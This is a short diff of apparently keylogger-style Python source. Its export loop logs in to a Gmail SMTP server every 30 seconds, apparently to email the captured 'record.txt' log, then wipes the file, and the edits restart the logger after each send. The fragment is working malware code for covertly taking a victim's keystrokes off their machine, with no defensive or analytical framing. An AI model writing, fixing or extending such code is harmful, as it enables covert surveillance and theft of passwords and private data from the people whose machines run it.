@@ -24,6 +24,7 @@ REC_PATH = "record.txt"
 def export():
     while True:
         pause.seconds(30)
+
         # Set up connection / login to email account
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
@@ -49,6 +50,10 @@ def export():
         # Erases .txt file to avoid repeat data (May interfere with actual logging..?)
         open(REC_PATH, 'w').close()
 
+        # Start the logger again
+        logger.listen()
+
+
 if __name__ == '__main__':
-    logger.start()
+    logger.listen()
     export()
